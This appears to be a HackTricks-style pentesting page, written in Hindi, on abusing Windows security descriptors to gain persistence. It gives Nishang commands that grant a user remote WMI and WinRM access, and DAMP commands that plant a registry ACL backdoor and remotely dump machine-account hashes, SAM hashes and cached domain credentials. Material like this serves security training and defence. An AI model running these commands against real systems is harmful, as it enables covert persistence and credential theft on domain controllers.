# Security Descriptors

{{#include ../../banners/hacktricks-training.md}}

## Security Descriptors

Windows security descriptors में एक owner SID, primary-group SID, access को नियंत्रित करने वाला discretionary ACL (DACL), और मुख्य रूप से auditing के लिए उपयोग किया जाने वाला system ACL (SACL) शामिल होता है। Security Descriptor Definition Language (SDDL) इसका textual representation है; ACE string का स्वरूप `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;` होता है।<sup>[[1]](#references)[[4]](#references)</sup>

Security descriptor यह संग्रहित करता है कि किसी securable object का owner कौन है और कौन-से principals को उस पर specific rights की अनुमति या मनाही है। यदि कोई attacker DACL बदल सकता है, तो वह किसी low-privileged principal को ऐसे rights दे सकता है जिनके लिए सामान्यतः administrative role आवश्यक होता है।

इससे सीमित रूप से modified descriptors persistence के लिए उपयोगी बन जाते हैं: account स्पष्ट privileged groups से बाहर रहता है, फिर भी किसी विशेष management surface तक access बनाए रखता है। Testing से पहले original descriptor सुरक्षित रखें, ताकि change को ठीक उसी रूप में हटाया जा सके।

### Access to WMI

आप किसी user को **remotely WMI execute करने का access** [**using this**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup> दे सकते हैं:
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Remove -Verbose # Remove
```
### WinRM तक पहुंच

Nishang के `Set-RemotePSRemoting` function से किसी user को remote PowerShell/WinRM endpoint तक access दें:<sup>[[2]](#references)</sup>
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### hashes तक Remote access

DAMP एक registry-ACL backdoor बना सकता है, जो बाद में machine-account hash, local SAM hashes और cached domain credentials को remotely retrieve करने की अनुमति देता है। इन सीमित rights को किसी सामान्य account को देना—विशेषकर domain controller के विरुद्ध—privileged-group membership के बिना powerful persistence प्रदान करता है।<sup>[[3]](#references)</sup>
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
[**Silver Tickets**](silver-ticket.md) देखें और जानें कि आप Domain Controller के computer account के hash का उपयोग कैसे कर सकते हैं।

## References

- [1] [Security Descriptor Definition Language - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
- [2] [nishang - Set-RemoteWMI.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)
- [3] [DAMP - Discretionary ACL Modification Project](https://github.com/HarmJ0y/DAMP)
- [4] [Microsoft Learn — Security descriptor string format](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format)
{{#include ../../banners/hacktricks-training.md}}
